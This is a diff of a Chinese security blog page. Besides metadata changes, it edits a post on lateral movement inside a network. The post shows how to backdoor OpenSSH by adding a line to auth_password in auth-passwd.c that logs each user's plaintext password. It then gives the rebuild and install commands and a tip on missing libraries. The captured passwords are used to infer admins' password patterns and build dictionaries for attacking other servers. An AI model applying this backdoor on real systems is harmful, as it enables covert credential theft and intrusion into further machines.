@@ -79,17 +79,16 @@
 
 
 
-<meta name="description" content="一个安全工程师">
+<meta name="description" content="人之过 在于好为人师">
 <meta property="og:type" content="website">
 <meta property="og:title" content="初心·守一">
-<meta property="og:url" content="http://reboot.cf/about/index.html">
+<meta property="og:url" content="http://reboot.cf/archives/index.html">
 <meta property="og:site_name" content="初心·守一">
-<meta property="og:description" content="一个安全工程师">
+<meta property="og:description" content="人之过 在于好为人师">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-01-17T09:21:20.467Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="初心·守一">
-<meta name="twitter:description" content="一个安全工程师">
+<meta name="twitter:description" content="人之过 在于好为人师">
 
 
 
@@ -117,7 +116,7 @@
 
 
 
-  <link rel="canonical" href="http://reboot.cf/about/"/>
+  <link rel="canonical" href="http://reboot.cf/archives/"/>
 
 
 
@@ -328,11 +327,13 @@
       
 
       
-        <p>横向渗透的时候，通过重新编译添加后门 的OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p>
+        <p>横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p>
 <p>编辑 auth-passwd.c 文件，在 auth_password 函数中添加：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logit(<span class="string">"username: %s password: %s"</span>, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure>
 <p>重新编译安装：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<p>有些环境在编译的时候会报缺少xx头文件的错，安装对于的库就可以了，比如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libssl-dev libz-dev</span><br></pre></td></tr></table></figure>
 <p>查看记录的登录密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>
       
